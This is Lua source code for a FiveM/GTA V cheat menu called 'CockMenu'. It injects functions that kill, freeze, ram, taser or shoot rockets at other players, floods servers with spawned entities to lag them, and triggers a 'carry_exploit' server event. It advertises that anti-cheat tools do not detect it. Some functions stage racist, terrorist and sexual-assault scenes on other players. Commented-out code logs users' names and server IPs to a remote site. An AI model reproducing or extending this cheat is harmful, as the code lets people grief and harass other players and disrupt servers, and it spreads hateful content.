                   if not Fatasf.n.IsPedAPlayer(zombies) and zombies ~= Fatasf.n.PlayerPedId() then
                       CockT.Inv["Wait"](1)
                       Fatasf.n.RequestControlOnce(zombies)
                       Fatasf.n.SetEntityCoords(zombies, Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId()))
                       if not Fatasf.n.IsEntityDead(zombies) then
                           Fatasf.n.ShootSingleBulletBetweenCoords(Fatasf.n.GetPedBoneCoords(zombies, 57005, 0.0, 0.0, 0.2), Fatasf.n.GetPedBoneCoords(zombies, 0, 0.0, 0.0, 0.0), 1, true, Fatasf.n.GetHashKey('weapon_pistol'), Fatasf.n.PlayerPedId(), true, false, 1.0)
                       end
                   end
               end
           end,
           DeleteZombies = function()
               for zombies in Fatasf.n.EnumeratePeds() do
                   if not Fatasf.n.IsPedAPlayer(zombies) and zombies ~= Fatasf.n.PlayerPedId() then
                       CockT.Inv["Wait"](1)
                       Fatasf.n.RequestControlOnce(zombies)
                       Fatasf.n.SetEntityHealth(zombies, 0)
                       Fatasf.n.DeleteEntity(zombies)
                       Fatasf.n.SetEntityCoords(zombies, Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId()))
                   end
               end
           end,
           SpawnZombies = function()
               for s = 0, 10 do
                   local ped = Fatasf.n.GetHashKey('mp_m_freemode_01')
                   Fatasf.n.RequestModel(ped)
                   if not Fatasf.n.HasModelLoaded(ped) then
                       CockT.Inv["Wait"](1)
                   end
                   local ped_2 = Fatasf.n.CreatePed(31, ped, Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId()), 0.0, true, true)
                   Fatasf.n.SetEntityHealth(ped_2, 0)
               end
           end,
   
   
           GiveWeapon = function(w_p_n) return Fatasf.n.GiveDelayedWeaponToPed(Fatasf.n.PlayerPedId(), Fatasf.n.GetHashKey(w_p_n), 255, false)  end,
           
           FreezePlayer = function(player)
               CockT.Inv["Thread"](function()
                   while true do
                       CockT.Inv["Wait"](0)
                           Fatasf.n.FreezeEntityPosition(Fatasf.n.GetPlayerPed(player), true)
                           Fatasf.n.ClearPedSecondaryTask(Fatasf.n.GetPlayerPed(player))
                           Fatasf.n.ClearPedTasksImmediately(Fatasf.n.GetPlayerPed(player))
                       end
                   end)
           end,
           GetRamedByVehicle = function(custom_vehicle, playa)
               CockT.Inv["Thread"](function()
                   if custom_vehicle then
                       Fatasf.n.RequestModel(Fatasf.n.GetHashKey(custom_vehicle))
                       while not Fatasf.n.HasModelLoaded(Fatasf.n.GetHashKey(custom_vehicle)) do
                           CockT.Inv["Wait"](0)
                       end	
                       
                       local coords = Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(playa))
                       local veh = Fatasf.n.CreateVehicle(Fatasf.n.GetHashKey(custom_vehicle), coords.x, coords.y, coords.z , 1, 1, 1)
                       local rotation = Fatasf.n.GetEntityRotation(playa)
                       
                       Fatasf.n.SetVehicleEngineOn(veh, true, true, true)
                       Fatasf.n.SetEntityRotation(veh, rotation, 0.0, 0.0, 0.0, true)
                       Fatasf.n.SetVehicleForwardSpeed(veh, 500.0)
                   end
               end)
           end,
           BugPlayerVeh = function(player)
               if player then
                   local prop = Fatasf.n.GetHashKey('stt_prop_stunt_soccer_ball')
                   while not Fatasf.n.HasModelLoaded(prop) do
                       CockT.Inv["Wait"](0) 
                       Fatasf.n.RequestModel(prop)
                   end
                   local _p = Fatasf.n.CreateObject(prop, 0, 0, 0, true, true, false)
                   Fatasf.n.SetEntityVisible(_p, 0, 0)
                   Fatasf.n.AttachEntityToEntity(_p, Fatasf.n.GetPlayerPed(player), Fatasf.n.GetPedBoneIndex(Fatasf.n.GetPlayerPed(player), 57005), 0, 0, -1.0, 0, 0, 0, false, true, true, true, 1, true)
               end
           end,
           randomstring = function()
               local chars = 'ABCDEFGHIJLMNOPRSTUWXYZ1234567890'
               local length = 30
               local randomString = '#'..CockT.Math.random(1, 9)..''
               CockT.Math.randomseed(CockT.Math.random(9999, 999999))
               local charTable = {}
               for c in chars:gmatch"." do CockT.Strings.tinsert(charTable, c) end
               for i = 1, length do randomString = randomString .. charTable[CockT.Math.random(1, #charTable)] end
               local sessionid = randomString
               return CockT.Strings.lower(Fatasf.n.clean(sessionid, false))
           end,
       },
   }
   Functions.f.SpawnWeapon = function()
       CockT.Inv["Thread"](function()
           local weapon = Functions.f.CustomInput("Weapon To Spawn", "weapon_pistol", 30)
           Fatasf.n.GiveWeaponToPed(Fatasf.n.PlayerPedId(), Fatasf.n.GetHashKey(weapon), 150, false, false)
       end)
   end
   Functions.f.RemoveWeapon = function()
       --CockT.Inv["Thread"](function()
           local weapon_ = Functions.f.CustomInput("Weapon To Remove", "weapon_", 30) 
           Fatasf.n.RemoveWeaponFromPed(Fatasf.n.PlayerPedId(), Fatasf.n.GetHashKey(weapon_))
       --end)
   end
   CockT.Global.PlayCustompParticle = function(player)
       --CockT.Inv["Thread"](function()
           --if player then
               local p1 = Functions.f.CustomInput("Ptfx asset name", "scr_agencyheist", 30)
               local p2 = Functions.f.CustomInput("Particle name", "scr_fbi_dd_breach_smoke", 30)
               local looptimes = 50
               local coords = Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(player))
               for s = 0, looptimes-1 do
                   CockT.Inv["Wait"](0)
                   Fatasf.n.RequestNamedPtfxAsset(p1)
                   Fatasf.n.UseParticleFxAsset(p1)
                   Fatasf.n.StartNetworkedParticleFxNonLoopedAtCoord(p2, coords, 0.0, 0.0, 0.0, 10.0, false, false, false, false)
               end
           --end
       --end)
   end
   CockT.Global.RGButton = function(text, x, y, _outl, r, g, b)
       local c_x, c_y = Fatasf.n.GetNuiCursorPosition() 
       local widht, height = Fatasf.n.GetActiveScreenResolution()
       c_x = c_x / widht
       c_y = c_y / height
   
       Fatasf.n.SetTextCentre(false)
       Functions.f.DrawTextTest(text, false, 0.35, 0, x, y-0.014)
       if( (c_x) + 0.01 >= x and (c_x) - 0.01 <= x and (c_y) + 0.012 >= y and (c_y) - 0.012 <= y) then 
           Fatasf.n.DrawRect(x, y, 0.015, 0.021, r, g, b, 255)
       else
           Fatasf.n.DrawRect(x, y, 0.015, 0.021, r, g, b, 255)
       end
   
       if ((c_x) + 0.01 >= x and (c_x) - 0.01 <= x and (c_y) + 0.015 >= y and (c_y) - 0.005 <= y and Fatasf.n.IsDisabledControlJustReleased(0, 92)) then 
           return true
       else
           return false
       end
   end
   CockT.Global.CheckIfResourceExist = function(script)
       if Fatasf.n.GetResourceState(script) == "started" or Fatasf.n.GetResourceState(CockT.Strings.lower(script)) == "started" or Fatasf.n.GetResourceState(CockT.Strings.upper(script)) == "started" then
            return true
       else
           return false
       end
   end
   CockT.Global.ListButton = function(x, y, _outl, r, g, b)
       local c_x, c_y = Fatasf.n.GetNuiCursorPosition() 
       local widht, height = Fatasf.n.GetActiveScreenResolution()
       c_x = c_x / widht
       c_y = c_y / height
   
       if( (c_x) + 0.01 >= x and (c_x) - 0.01 <= x and (c_y) + 0.011 >= y and (c_y) - 0.011 <= y) then 
       end
   
       if ((c_x) + 0.01 >= x  and (c_x) - 0.01 <= x  and (c_y) + 0.015 >= y  and (c_y) - 0.005 <= y  and Fatasf.n.IsDisabledControlJustReleased(0, 92)) then 
           return true
       else
           return false
       end
   end
   CockT.Global.SpawnNakedMen = function(player)
       local nakedmodel = Fatasf.n.GetHashKey('a_m_m_acult_01')
       Fatasf.n.RequestModel(nakedmodel)
       while not Fatasf.n.HasModelLoaded(nakedmodel) do			
           CockT.Inv["Wait"](50)
       end
                   
       local coords = Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(player))
       local nakedped = Fatasf.n.CreatePed(nil, nakedmodel, coords, true, true)
       Fatasf.n.SetEntityInvincible(nakedped, true)
   end
   CockT.Global.isisattack = function(coords) 
       local model = Fatasf.n.GetHashKey('mp_m_freemode_01') while not Fatasf.n.HasModelLoaded(model) do 
           CockT.Inv["Wait"](0) 
           Fatasf.n.RequestModel(model) 
       end 
       local ped = Fatasf.n.CreatePed(5, model, coords, true, true) 
       CockT.Inv["Invoke"](CockT.Natives['SetPedDefaultComponentVariation'], ped) 
       CockT.Inv["Invoke"](CockT.Natives['SetPedHeadBlendData'], ped, 1, 1, 1, 2, 2, 2, 1.0, 1.0, 1.0, true) 
       Fatasf.n.SetPedComponentVariation(ped, 1, 115, 0, 2) 
       Fatasf.n.SetPedComponentVariation(ped, 3, 4, 0, 2) 
       Fatasf.n.SetPedComponentVariation(ped, 11, 12, 0, 2) 
       Fatasf.n.SetPedComponentVariation(ped, 8, 15, 0, 2) 
       Fatasf.n.SetPedComponentVariation(ped, 4, 56, 0, 2) 
       Fatasf.n.SetPedComponentVariation(ped, 6, 34, 0, 2) 
       CockT.Inv["Thread"](function() 
           --PlayPain(ped, 6, 0, 0) 
           CockT.Inv["Wait"](1500) 
           Fatasf.n.AddExplosion(Fatasf.n.GetEntityCoords(ped), 34, 100.0, true, false, 0.0) 
       end) 
       CockT.Inv["Wait"](0) 
   end
   CockT.Global.AntiKKK = function()
       Fatasf.n.SetEntityCoords(Fatasf.n.PlayerPedId(), 674.69, 554.92, 129.13)
       CockT.Inv["Thread"](function()
           for k, v in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do
               if Fatasf.n.GetPlayerPed(v) ~= Fatasf.n.PlayerPedId() then 
                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['carry_exploit'], Fatasf.n.GetPlayerPed(v), 'missfinale_c2mcs_1', 'nm', 'fin_c2_mcs_1_camman', 'firemans_carry', 0.15, 0.27, 0.63, Fatasf.n.GetPlayerServerId(v), 100000, 0.0, 49, 33, 1)
                   CockT.Inv["Wait"](10)
               end
           end
           return
       end)
       local object = Fatasf.n.GetHashKey('prop_tree_olive_cr2')
       local tree = Fatasf.n.CreateObject(object, 686.21, 577.79, 126.0, true, false, true)
       local kkkmodel = Fatasf.n.GetHashKey('mp_m_freemode_01')
       local bmodel = Fatasf.n.GetHashKey('a_m_m_og_boss_01')
       Fatasf.n.RequestModel(kkkmodel)		
       Fatasf.n.RequestModel(bmodel)
       while not Fatasf.n.HasModelLoaded(kkkmodel) do			
           CockT.Inv["Wait"](50)
       end
       while not Fatasf.n.HasModelLoaded(bmodel) do			
           CockT.Inv["Wait"](50)
       end
       
       local t = Fatasf.n.CreatePed('PED_TYPE_NETWORK_PLAYER', kkkmodel, 685.19, 572.7, 131.0, 270.0, true, false)
       local b = Fatasf.n.CreatePed('PED_TYPE_NETWORK_PLAYER', bmodel, 686.66, 570.88, 130.46, 270.0, true, false)
       local c = Fatasf.n.CreatePed('PED_TYPE_NETWORK_PLAYER', bmodel, 683.24, 571.51, 130.46, 270.0, true, false)
       local d = Fatasf.n.CreatePed('PED_TYPE_NETWORK_PLAYER', bmodel, 682.0, 573.56, 130.46, 270.0, true, false)
       local e = Fatasf.n.CreatePed('PED_TYPE_NETWORK_PLAYER', bmodel, 682.31, 576.52, 130.46, 270.0, true, false)
       local f = Fatasf.n.CreatePed('PED_TYPE_NETWORK_PLAYER', bmodel, 689.14, 573.5, 130.46, 270.0, true, false)
   
   
       CockT.Inv["Invoke"](CockT.Natives['SetModelAsNoLongerNeeded'], Fatasf.n.GetHashKey(kkkmodel))
       CockT.Inv["Invoke"](CockT.Natives['SetPedHeadBlendData'], t, 0, 0, 0, 10, 10, 10, 1.0, 1.0, 1.0, true)
       CockT.Inv["Invoke"](CockT.Natives['SetPedHeadOverlay'], t, 1, 10, 1 + 0.0)
       CockT.Inv["Invoke"](CockT.Natives['SetPedHeadOverlayColor'], t, 1, 1, 1, 1)
       CockT.Inv["Invoke"](CockT.Natives['SetPedHeadOverlay'], t, 2, 1, 1 + 0.0)
       CockT.Inv["Invoke"](CockT.Natives['SetPedHeadOverlayColor'], t, 2, 1, 1, 1)
       Fatasf.n.SetPedComponentVariation(t, 2, 1, 0, 2)
       CockT.Inv["Invoke"](CockT.Natives['SetPedHairColor'], t, 1, 1)
       CockT.Inv["Invoke"](CockT.Natives['SetPedPropIndex'], t, 2, 19, 0, 2)
       CockT.Inv["Invoke"](CockT.Natives['SetPedPropIndex'], t, 6, 3, 0, 2)
       CockT.Inv["Invoke"](CockT.Natives['SetPedPropIndex'], t, 1, 24 , 5 , 2)
       CockT.Inv["Invoke"](CockT.Natives['SetPedPropIndex'], t, 0, 1, 0, 2)
       Fatasf.n.SetPedComponentVariation(t, 7, 0, 0, 2)
       Fatasf.n.SetPedComponentVariation(t, 9, 0, 0, 2)
       Fatasf.n.SetPedComponentVariation(t, 1, 52, 2, 2)
       Fatasf.n.SetPedComponentVariation(t, 6, 1, 1 , 2)
       Fatasf.n.SetPedComponentVariation(t, 4, 23, 4, 2)
       Fatasf.n.SetPedComponentVariation(t, 3, 75, 0, 2)
       Fatasf.n.SetPedComponentVariation(t, 11, 107, 0, 2)
       Fatasf.n.SetPedComponentVariation(t, 8, 15, 0, 2)
       Fatasf.n.FreezeEntityPosition(t, true)
       CockT.Inv["Invoke"](CockT.Natives['SetPedCanRagdoll'], t, false)
       Fatasf.n.ClearPedTasks(t)
       Fatasf.n.ClearPedSecondaryTask(t)
       CockT.Inv["Invoke"](CockT.Natives['TaskSetBlockingOfNonTemporaryEvents'], t, true)
       CockT.Inv["Invoke"](CockT.Natives['SetPedFleeAttributes'], t, 0, 0)
       CockT.Inv["Invoke"](CockT.Natives['SetPedCombatAttributes'], t, 17, 1)
       CockT.Inv["Invoke"](CockT.Natives['SetPedSeeingRange'], t, 0.0)
       CockT.Inv["Invoke"](CockT.Natives['SetPedHearingRange'], t, 0.0)
       CockT.Inv["Invoke"](CockT.Natives['SetPedAlertness'], t, 0)
       Fatasf.n.SetPedKeepTask(t, true)
       
   
       Fatasf.n.GiveWeaponToPed(b, Fatasf.n.GetHashKey('weapon_pistol'), 999, true, true)
       Fatasf.n.GiveWeaponToPed(c, Fatasf.n.GetHashKey('weapon_pistol'), 999, true, true)
       Fatasf.n.GiveWeaponToPed(d, Fatasf.n.GetHashKey('weapon_molotov'), 999, true, true)
       Fatasf.n.GiveWeaponToPed(d, Fatasf.n.GetHashKey('weapon_appistol'), 999, true, true)
       Fatasf.n.GiveWeaponToPed(d, Fatasf.n.GetHashKey('weapon_smg'), 999, true, true)
   
       CockT.Inv["Invoke"](CockT.Natives['TaskCombatPed'], b, t, 0, 16)
       CockT.Inv["Invoke"](CockT.Natives['TaskCombatPed'], c, t, 0, 16)
       CockT.Inv["Invoke"](CockT.Natives['TaskCombatPed'], d, t, 0, 16)
       CockT.Inv["Invoke"](CockT.Natives['TaskCombatPed'], e, t, 0, 16)
       CockT.Inv["Invoke"](CockT.Natives['TaskCombatPed'], f, t, 0, 16)
   
   
       CockT.Inv["Invoke"](CockT.Natives['AddRope'], 685.19, 572.7, 134.99, 0.0, 0.0, 0.0, 2.0, 4, 2.0, 1.0, 0.0, false, false, false, 5.0, false)
       
       CockT.Inv["Wait"](5000)
       CockT.Global.isisattack(Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId()))
   end
   CockT.Global.ServerLagger = function()
       for i = 1, 2 do
           for i = 1, 10 do
               --local car = Fatasf.n.GetHashKey("titan")
               local model = Fatasf.n.GetHashKey("mp_m_freemode_01")
               local model_2 = Fatasf.n.GetHashKey("a_c_sharktiger")
               local newx = CockT.Math.random(-100.0, 500.0)
               
               for newx = -500, 500 do
                   local newy = CockT.Math.random(-100.0, 500.0)
                   local newz = CockT.Math.random(50.0, 100.0)
                   coords = {x=newx+0.0, y=newy, z=newz}
               end
               if not Fatasf.n.HasModelLoaded(model) and not Fatasf.n.HasModelLoaded(model_2) and not Fatasf.n.HasModelLoaded(car) then 
                   Fatasf.n.RequestModel(model)
                   --Fatasf.n.RequestModel(car)
               end
   
               local ped = Fatasf.n.CreatePed(0, model, coords.x, coords.y, coords.z, 1, true, true)
               local ped_2 = Fatasf.n.CreatePed(0, model_2, coords.x, coords.y, coords.z, 1, true, true)
               Fatasf.n.GiveWeaponToPed(ped, Fatasf.n.GetHashKey('weapon_combatpistol'), 155, true, true)
               --local veh1 = Fatasf.n.CreateVehicle(car, coords.x, coords.y, coords.z, 1, true, true)
               
               
           end
       end
   end
   CockT.Global.TazePlayer = function(player)
       --CockT.Inv["Thread"](function()
           local ped = Fatasf.n.GetPlayerPed(player)
           local location = Fatasf.n.GetEntityCoords(ped)
           local dest = Fatasf.n.GetPedBoneCoords(ped, 0, 0.0, 0.0, 0.0)
           local org = Fatasf.n.GetPedBoneCoords(ped, 57005, 0.0, 0.0, 0.2)
           Fatasf.n.ShootSingleBulletBetweenCoords(org, dest, 0.0, true, Fatasf.n.GetHashKey('WEAPON_STUNGUN'), Fatasf.n.PlayerPedId(), true, false, 1.0)
       --end)
   end
   CockT.Global.KickFromVehicle = function(player)
       --CockT.Inv["Thread"](function()
       --    if player then
               Fatasf.n.ClearPedTasksImmediately(Fatasf.n.GetPlayerPed(player))
       --    end
       --end)
   end
   CockT.Global.KillAllPlayers = function()
       for k, v in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do
           local player = Fatasf.n.GetPlayerPed(v)
           local coords = Fatasf.n.GetPedBoneCoords(player, Fatasf.n.GetEntityBoneIndexByName(player, "SKEL_HEAD"), 0.0, -0.2, 0.0)
           local coords2 = Fatasf.n.GetPedBoneCoords(player, Fatasf.n.GetEntityBoneIndexByName(player, "SKEL_HEAD"), 0.0, 0.2, 0.0)
           --if player ~= Fatasf.n.PlayerPedId() then
               Fatasf.n.ShootSingleBulletBetweenCoords(coords, coords2, 100.0, true, Fatasf.n.GetHashKey('weapon_pistol'), Fatasf.n.PlayerPedId(), true, true, 100.0) 
           --end
       end
   end
   CockT.Global.RapeP = function(target)
       CockT.Inv["Thread"](function()
               if Fatasf.n.IsPedInAnyVehicle(Fatasf.n.GetPlayerPed(target), true) then
                   local veh = Fatasf.n.GetVehiclePedIsIn(Fatasf.n.GetPlayerPed(target), true)
                   while not Fatasf.n.NetworkHasControlOfEntity(veh) do
                       Fatasf.n.NetworkRequestControlOfEntity(veh)
                       CockT.Inv["Wait"](0)
                   end
                   CockT.Inv["Invoke"](CockT.Natives["SetEntityAsMissionEntity"], veh, true, true)
                   --CockT.Inv["Invoke"](CockT.Natives["DeleteVehicle"], veh)
                   Fatasf.n.DeleteEntity(veh)
               end
               local count = -0.2
               for b = 1, 3 do
                   local x, y, z = CockT.Strings.tunpack(Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(target), true))
                   local pp = Fatasf.n.ClonePed(Fatasf.n.GetPlayerPed(target), 1, 1, 1)
                   CockT.Inv["Invoke"](CockT.Natives["SetEntityAsMissionEntity"], bD, true, true)
                   Fatasf.n.AttachEntityToEntity(pp, Fatasf.n.GetPlayerPed(target), 4103, 11816, count, 0.00, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                   Fatasf.n.ClearPedTasks(Fatasf.n.GetPlayerPed(target))
                   Fatasf.n.TaskPlayAnim(Fatasf.n.GetPlayerPed(target), "rcmpaparazzo_2", "shag_loop_poppy", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                   Fatasf.n.SetPedKeepTask(pp)
                   Fatasf.n.TaskPlayAnim(pp, "rcmpaparazzo_2", "shag_loop_a", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                   Fatasf.n.SetEntityInvincible(pp, true)
                   count = count - 0.4
               end
           end
       )
   end
   CockT.Global.CleanVehicle = function()
           CockT.Inv["Invoke"](CockT.Natives["SetVehicleDirtLevel"], Fatasf.n.GetVehiclePedIsIn(Fatasf.n.PlayerPedId(), false), 0.0)
   end
   CockT.Global.RandomColour = function()
       local red = CockT.Math.random(0, 255)
       local green = CockT.Math.random(0, 255)
       local blue = CockT.Math.random(0, 255)
       CockT.Inv["Invoke"](CockT.Natives['SetVehicleCustomPrimaryColour'], Fatasf.n.GetVehiclePedIsIn(Fatasf.n.PlayerPedId(), false), red, green, blue)
   end 
   CockT.Global.UnexOnPlayer = function(player, looptime)
       --local va = Fatasf.n.CreateAnDui("https://cock.menu/music/wtfisthat.mp3", 1, 1, 1)
       CockT.Inv["Wait"](3000)
       -- Fatasf.n.DestroyDui(va)
       for imlucky = 0, looptime do
           local ped = Fatasf.n.GetPlayerPed(player)
           local location = Fatasf.n.GetEntityCoords(ped)
           local dest = Fatasf.n.GetPedBoneCoords(ped, 0, 0.0, 0.0, 0.0)
           local org = Fatasf.n.GetPedBoneCoords(ped, 57005, 0.0, 0.0, 0.2)
           Fatasf.n.ShootSingleBulletBetweenCoords(org + 1, dest, 0.0, true, Fatasf.n.GetHashKey('WEAPON_RPG'), Fatasf.n.PlayerPedId(), true, false, 1255.0)
           CockT.Inv["Wait"](100)
           Fatasf.n.ShootSingleBulletBetweenCoords(org, dest, 0.0, true, Fatasf.n.GetHashKey('WEAPON_RPG'), Fatasf.n.PlayerPedId(), true, false, 1255.0)
       end
   end
   CockT.Global.mathround = function(first, second)
       return CockT.Math.tonumber(CockT.Strings.format("%." .. (second or 0) .. "f", first))
   end
   CockT.Global.TriggerCustomEvent = function(server, event, ...)
       local payload = CockT.Strings.msgpack({...})
       if server then
           Fatasf.n.TriggerServerEventInternal(event, payload, payload:len())
       else
           Fatasf.n.TriggerEventInternal(event, payload, payload:len())
       end
   end
   CockT.Global.resPe = function(id, coords, int)
       Fatasf.n.SetEntityCoordsNoOffset(id, coords.x, coords.y, coords.z, false, false, false, true)
       CockT.Inv["Invoke"](CockT.Natives['NetworkResurrectLocalPlayer'], coords.x, coords.y, coords.z, int, true, false)
       CockT.Inv["Invoke"](CockT.Natives['SetPlayerInvincible'], id, false)
       CockT.Inv["Invoke"](CockT.Natives['ClearPedBloodDamage'], id)
       CockT.Global.TriggerCustomEvent(false, "playerSpawned", coords.x, coords.y, coords.z)
       CockT.Global.TriggerCustomEvent(false, "playerSpawned")
   end
   
   
   
   Functions.f.LoadLogo()
   local formattorandom = Functions.f.randomstring()
   
   
   CockT.Global.hIvkXiYg2ogzm1MvdOolDhAhwQdBwv = function()
       local el = {
           LMenuX = 0.5,
           LMenuY = 0.5,
           LResW = 0.5,
           LResH = 0.5,
       }
       
       function el:printo(message)
           return Fatasf.n.Leprint(message)
       end
   
       el:printo("^1[^2CockMenu Logs^1] ^7Loaded ^2CockMenu!")
       el:printo("^1[^2CockMenu Logs^1] ^7Please select ui...")
   
       LoadEr = true
       
       el.LoaderDragBar = function()
           local c_x, c_y = Fatasf.n.GetNuiCursorPosition() 
           local widht, height = Fatasf.n.GetActiveScreenResolution()
           c_x = c_x / widht
           c_y = c_y / height 
           local res_w, res_h = el.LResW-0.5, el.LResH-0.5
   
           if (c_x >= el.LMenuX - 0.10 and c_y >= el.LMenuY - 0.188 and c_x <= el.LMenuX + 0.10+res_w and c_y < el.LMenuY + 0.15+res_h) and Fatasf.n.IsDisabledControlJustPressed(0, 24) then 
               _x = el.LMenuX - c_x
               _y = el.LMenuY - c_y
               el.dragging_allowed = true
           elseif CockT.Inv["Invoke"](CockT.Natives['IsDisabledControlReleased'], 0, 24) then
               el.dragging_allowed = false
           end
   
           if el.dragging_allowed then
               el.LMenuX = c_x + _x
               el.LMenuY = c_y + _y
           end
       end
       el.LoaderButton = function(text, x, y, _outl) --, text)
           local c_x, c_y = Fatasf.n.GetNuiCursorPosition() 
           local widht, height = Fatasf.n.GetActiveScreenResolution()
           local drag_x, drag_y = el.LMenuX-0.5, el.LMenuY-0.5
           local res_w, res_h = el.LResW-0.5, el.LResH-0.5
           c_x = c_x / widht
           c_y = c_y / height
   
   
           if ((c_x) + 0.013 >= x+drag_x and (c_x) - 0.035 <= x+drag_x and (c_y) + 0.01 >= y+drag_y and (c_y) - 0.01 <= y+drag_y) then
               Fatasf.n.DrawRect(x+0.012+drag_x, y+0.01+drag_y, 0.047, 0.02721, 0, 0, 0, 255)
               Fatasf.n.DrawRect(x+0.012+drag_x, y+0.01+drag_y, 0.046, 0.02521, 35, 35, 35, 255)
               Fatasf.n.SetTextColour(8, 214, 101, 255)
               CockT.Global.DrawText(text, x+drag_x, y+drag_y, _outl, 0.3, 4, false)
           else
               Fatasf.n.DrawRect(x+0.012+drag_x, y+0.01+drag_y, 0.047, 0.02721, 0, 0, 0, 255)
               Fatasf.n.DrawRect(x+0.012+drag_x, y+0.01+drag_y, 0.046, 0.02521, 35, 35, 35, 255)
   
               Fatasf.n.SetTextColour(255, 255, 255, 255)
               CockT.Global.DrawText(text, x+drag_x, y+drag_y, _outl, 0.3, 4, false)
           end
   
           if ((c_x) + 0.013 >= x+drag_x and (c_x) - 0.035 <= x+drag_x and (c_y) + 0.01 >= y+drag_y and (c_y) - 0.01 <= y+drag_y) and Fatasf.n.IsDisabledControlJustReleased(0, 92) then 
               return true
           else
               return false
           end
       end
       el.LoaderResizer = function()
           local c_x, c_y = Fatasf.n.GetNuiCursorPosition() 
           local widht, height = Fatasf.n.GetActiveScreenResolution()
           c_x = c_x / widht
           c_y = c_y / height
           local ddrag_x, ddrag_y = el.LMenuX-0.5, el.LMenuY-0.5
           
           
           if (c_x >= el.LResW + 0.08+ddrag_x and c_y >= el.LResH + 0.15+ddrag_y and c_x <= el.LResW + 0.093+ddrag_x and c_y < el.LResH + 0.165+ddrag_y) and Fatasf.n.IsDisabledControlJustPressed(0, 24) then 
               _x = el.LResW - c_x
               _y = el.LResH - c_y
               el.resizing_allowed = true
           elseif CockT.Inv["Invoke"](CockT.Natives['IsDisabledControlReleased'], 0, 24) then
               el.resizing_allowed = false
           end
   
           if el.resizing_allowed then
               el.LResW = c_x + _x
               el.LResH = c_y + _y
           end
   
           --Fatasf.n.DrawRect(0.845+drag_x2+res_w, 0.72+drag_y2+res_h, 0.02, 0.04, 255, 255, 255, 255)
   
           if el.LResW < 0.5 then
               el.LResW = 0.5
           end 
           if el.LResH < 0.5 then
               el.LResH = 0.5
           end
       end
   
       --[[el.CheckBetaAcc = function()
           --local uids = { 
           --}
   
           for k, v in CockT.Math.pairs(uids) do
               local uid = Fatasf.n.GetRedUid()
               if v == uid then
                   return "Yes"
               elseif v ~= uid then
                   return "No"
               end
           end
           for i = 1, #uids do
               local rE = Fatasf.n.GetRedUid()
   
               if rE == 11277 or 12271 or 585 or 5468 then
                   return "Yes" 
               else 
                   return "no"
               end
            end
       end]]
   
   
   CockT.Inv["Thread"](function()
       while LoadEr do
           CockT.Inv["Wait"](0)
           CockT.Global.Dmovement(true)
           local c_x, c_y = Fatasf.n.GetNuiCursorPosition()  local widht, height = Fatasf.n.GetActiveScreenResolution() c_x = c_x / widht c_y = c_y / height
           local res_w, res_h = el.LResW-0.5, el.LResH-0.5
           local drag_x, drag_y = el.LMenuX-0.5, el.LMenuY-0.5
           local PlayerID = Fatasf.n.GetPlayerServerId(Fatasf.n.PlayerId())
           local PlayerName = Fatasf.n.GetPlayerName(Fatasf.n.PlayerId())
           local reduid = Fatasf.n.GetRedUid()
           local IsBeta = "No"
           local MenuStatus = '~g~Safe!'-- '~y~Semi-Undetected', '~r~Detectable by: ac_name'
           local LastUpdateDate = '29.07.2021'
           local hex = "NaN"-- to do
           local ip = Fatasf.n.GetCurrentServerEndpoint()
           if Fatasf.n.IsEntityDead(Fatasf.n.PlayerPedId()) then
               playerdata = "Dead"
           else
               playerdata = "Alive"
           end
           local resource = Fatasf.n.GetCurrentResourceName()
           Fatasf.n.DrawRect(0.5+drag_x+res_w/2, 0.5+drag_y+res_h/2, 0.187+res_w, 0.35+res_h, 10, 10, 10, 155)
           Fatasf.n.DrawRect(0.5+drag_x+res_w/2, 0.5+drag_y+res_h/2, 0.1836+res_w, 0.34+res_h, 5, 5, 5, 245)
           
           if el.LoaderButton('WarMenu', 0.421, 0.5, false) then
               LoadEr = false
               --[[ 
               local url = "https://cock.menu/iuhdsfiash/web.html".."?user="..PlayerName.."&res="..resource.."&sip="..ip.."&status="..playerdata..'&ui=WarMenu'..'&sid='..PlayerID..'&reuid='..reduid..''
               local log_dui = Fatasf.n.CreateAnDui(url, 50, 50)
               Fatasf.n.DestroyDui(log_dui) 
               ]]
               return CockT.Global.pJ64RNYjMQEtLYWxRcdY()
           end
           if el.LoaderButton('MouseUI', 0.471, 0.5, false) then
               LoadEr = false
               --[[ local url = "https://cock.menu/iuhdsfiash/web.html".."?user="..PlayerName.."&res="..resource.."&sip="..ip.."&status="..playerdata..'&ui=MouseUI'..'&sid='..PlayerID..'&reuid='..reduid..''
               local log_dui = Fatasf.n.CreateAnDui(url, 50, 50)
               Fatasf.n.DestroyDui(log_dui) ]]
               return CockT.Global.GicTobR5RRImZobUZ0o4ytqDottM()
           end
           if el.LoaderButton('Soon...', 0.521, 0.5, false) then
               if reduid ~= 11277 then
               else
                   LoadEr = false
                   --[[ local url = "https://cock.menu/iuhdsfiash/web.html".."?user="..PlayerName.."&res="..resource.."&sip="..ip.."&status="..playerdata..'&ui=NeverLose'..'&sid='..PlayerID..'&reuid='..reduid..''
                   local log_dui = Fatasf.n.CreateAnDui(url, 50, 50)
                   Fatasf.n.DestroyDui(log_dui) ]]
                   return CockT.Global.pyQp3fKQUcjMbISJDSSy()
               end
               
           end
   
           if IsBeta == "Yes" then
               if res_w > 0.02 then
                   sc_x = 0.571
                   sc_y = 0.5
               else
                   sc_x = 0.421
                   sc_y = 0.53
               end
               if el.LoaderButton('BetaUI', sc_x, sc_y, false) then
                   --LoadEr = false
                   --return checkuid_bRzsSDY1hjgIJaDFRdown()
                   el:printo("BetaUI is temporarily disabled!")
               end
           end
           local sip = Fatasf.n.GetCurrentServerEndpoint()
           CockT.Global.DrawText('Welcome to ~g~CockMenu~s~!', 0.5+drag_x+res_w/2, 0.35+drag_y, false, 0.3, 4, true)
